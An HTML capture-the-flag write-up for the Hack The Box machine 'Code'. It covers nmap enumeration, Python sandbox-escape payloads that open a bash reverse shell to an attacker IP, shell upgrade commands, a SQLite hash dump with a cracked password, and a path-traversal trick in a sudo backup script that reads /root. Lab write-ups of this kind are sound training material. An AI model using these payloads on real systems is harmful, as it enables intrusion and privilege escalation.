@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Code &mdash; HTB Writeup</title>
+<style>
+  :root {
+    --bg: #f7f7f9;
+    --fg: #1d1d1f;
+    --muted: #5a5a5f;
+    --card: #ffffff;
+    --border: #e2e2e6;
+    --code-bg: #f0f0f3;
+    --accent: #7c3aed;
+    --link: #5b21b6;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121214;
+      --fg: #eaeaec;
+      --muted: #a0a0a6;
+      --card: #1b1b1e;
+      --border: #2d2d31;
+      --code-bg: #0f0f11;
+      --accent: #a78bfa;
+      --link: #c4b5fd;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    line-height: 1.65;
+  }
+  .wrap {
+    max-width: 760px;
+    margin: 0 auto;
+    padding: 2rem 1.25rem 4rem;
+  }
+  header.page-header {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 1.5rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+  }
+  header.page-header img.machine-icon {
+    width: 96px;
+    height: 96px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  header.page-header .meta h1 {
+    margin: 0 0 0.35rem;
+    font-size: 1.9rem;
+  }
+  header.page-header .meta .tags {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .badge {
+    display: inline-block;
+    font-size: 0.78rem;
+    padding: 0.2rem 0.6rem;
+    border-radius: 999px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+  .badge.difficulty-easy { color: #2e7d32; border-color: #2e7d3255; }
+  @media (prefers-color-scheme: dark) {
+    .badge.difficulty-easy { color: #81c995; }
+  }
+  nav.toc {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+  }
+  nav.toc h2 {
+    margin-top: 0;
+    font-size: 1rem;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    color: var(--muted);
+  }
+  nav.toc ul {
+    margin: 0;
+    padding-left: 1.1rem;
+  }
+  nav.toc li { margin: 0.25rem 0; }
+  nav.toc a { color: var(--link); text-decoration: none; }
+  nav.toc a:hover { text-decoration: underline; }
+  h1, h2, h3 { line-height: 1.3; }
+  h2 {
+    margin-top: 2.5rem;
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 0.3rem;
+  }
+  a { color: var(--link); }
+  p { margin: 1rem 0; }
+  code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 5px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--border);
+    display: block;
+    margin: 1.25rem 0;
+  }
+  figure {
+    margin: 1.5rem 0;
+  }
+  figcaption {
+    font-size: 0.85rem;
+    color: var(--muted);
+    text-align: center;
+    margin-top: 0.4rem;
+  }
+  blockquote.callout {
+    border-left: 4px solid var(--accent);
+    background: var(--card);
+    border-radius: 0 8px 8px 0;
+    padding: 0.75rem 1rem;
+    margin: 1.25rem 0;
+  }
+  blockquote.callout .callout-title {
+    font-weight: 600;
+    margin-bottom: 0.3rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.25rem 0;
+  }
+  th, td {
+    border: 1px solid var(--border);
+    padding: 0.5rem 0.75rem;
+    text-align: left;
+  }
+  th { background: var(--code-bg); }
+  footer {
+    margin-top: 3rem;
+    padding-top: 1rem;
+    border-top: 1px solid var(--border);
+    color: var(--muted);
+    font-size: 0.85rem;
+  }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="page-header">
+  <img class="machine-icon" src="/pngs/HTB/Easy/Code/Code.png" alt="Code machine icon from Hack The Box" loading="lazy">
+  <div class="meta">
+    <h1>Code</h1>
+    <div class="tags">
+      <span class="badge">Hack The Box</span>
+      <span class="badge">Linux</span>
+      <span class="badge difficulty-easy">Easy</span>
+      <span class="badge">Python / Flask</span>
+      <span class="badge">SQLite</span>
+    </div>
+  </div>
+</header>
+
+<nav class="toc">
+  <h2>Contents</h2>
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#user">User Access</a></li>
+    <li><a href="#privesc">Privilege Escalation</a></li>
+  </ul>
+</nav>
+
+<blockquote class="callout">
+  <div class="callout-title">Key takeaways</div>
+  <ul>
+    <li><strong>Online Python console</strong> &rarr; bypass of a keyword deny-list &rarr; <strong>remote code execution</strong></li>
+    <li><strong>SQLite3 database dump</strong> &rarr; cracked user hash &rarr; <strong>SSH access</strong></li>
+    <li><strong>Path traversal in a <code>sudo</code> backup script</strong></li>
+  </ul>
+</blockquote>
+
+<h2 id="enumeration">Enumeration</h2>
+<div class="terminal-box">sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.231.240
+
+22/tcp   open  ssh     syn-ack ttl 63
+5000/tcp open  upnp    syn-ack ttl 63</div>
+
+<p>I visit port <code>5000</code> and find that it is an online Python console.</p>
+
+<figure>
+  <img src="/pngs/HTB/Easy/Code/Pasted image 20260413161611.png" alt="Online Python console web application running on port 5000" loading="lazy">
+  <figcaption>Online Python console web application running on port 5000</figcaption>
+</figure>
+
+<h2 id="foothold">Foothold</h2>
+<p>While I try different commands to find something vulnerable, I get this response:</p>
+
+<div class="terminal-box">import os
+os.system("pwd")</div>
+
+<div class="terminal-box">Use of restricted keywords is not allowed</div>
+
+<p>So I started searching for Python bypass tricks and found two scripts that I can use for a reverse shell.</p>
+
+<div class="terminal-box">[w for w in ().__class__.__base__.__subclasses__() if w.__name__=='catch_warnings'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('bash -c "/bin/bash -i >&amp; /dev/tcp/10.10.14.235/1111 0>&amp;1";')</div>
+
+<p>Source: <a href="https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d">Some simple bypass tricks</a>.</p>
+
+<div class="terminal-box">[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('bash -c "/bin/bash -i >&amp; /dev/tcp/10.10.14.235/1111 0>&amp;1";')</div>
+
+<p>After I get the reverse shell, I have to upgrade it.</p>
+
+<div class="terminal-box">python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+#Press Ctrl + Z
+
+stty raw -echo ; fg
+
+reset
+
+screen
+
+export TERM=xterm</div>
+
+<h2 id="user">User Access</h2>
+<p>Now I can find the flag in the home directory.</p>
+
+<div class="terminal-box">app-production@code:~$ cat user.txt</div>
+
+<fieldset class="flag-box">
+  <legend>User Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+<h3>Root</h3>
+<p>The next thing is the <code>database</code> that I found.</p>
+
+<div class="terminal-box">sqlite3 ./instance/database.db
+
+sqlite> .tables
+
+sqlite> select * from user
+
+1|development|[REDACTED]
+2|martin|[REDACTED]</div>
+
+<p>I cracked it with <a href="https://crackstation.net/">crackstation</a>.</p>
+
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">martin</span> : <span class="pass">nafeelswordsmaster</span></code>
+</fieldset>
+
+<p>Then with SSH I connected as <span class="user">martin</span>.</p>
+
+<div class="terminal-box">martin@code:~/</div>
+
+<h2 id="privesc">Privilege Escalation</h2>
+<p>By using <code>sudo -l</code> I found out that I can run a script as root.</p>
+
+<div class="terminal-box">(ALL : ALL) NOPASSWD: /usr/bin/backy.sh</div>
+
+<p>While reading and trying to execute <code>backy.sh</code>, I find that I need to use a <code>.json</code> file. There is also a <code>task.json</code> file there already, so I can modify it.</p>
+
+<div class="terminal-box">task.json
+{
+	"destination": "/home/martin/backups/",
+	"multiprocessing": true,
+	"verbose_log": false,
+	"directories_to_archive": [
+		"/home/app-production/app"
+	],
+
+	"exclude": [
+		".*"
+	]
+}</div>
+
+<p>While reading the script, I can see that I need to use the <code>/home</code> or <code>/var</code> directory as a starting point.</p>
+
+<p>So I tried to modify the existing <code>task.json</code> file into a slightly different one.</p>
+
+<div class="terminal-box">test.json
+
+{
+  "destination": "/home/martin/backups/",
+  "multiprocessing": true,
+  "verbose_log": true,
+  "directories_to_archive": [
+    "/home/....//....//root/"
+  ]
+}</div>
+
+<div class="terminal-box">martin@code:~/backups$ sudo /usr/bin/backy.sh test.json</div>
+
+<p>It copied the root directory into a <code>.tar.bz2</code> file and I extracted the files.</p>
+
+<div class="terminal-box">bzip2 -d code_home_.._.._root_2026_April.tar.bz2
+
+tar -xvf code_home_.._.._root_2026_April.tar</div>
+
+<p>Now I can read the <code>root.txt</code> from my machine.</p>
+
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
+
+</div>
+<script src="/copy.js"></script>
+<script src="/nav.js"></script>
+</body>
+</html>
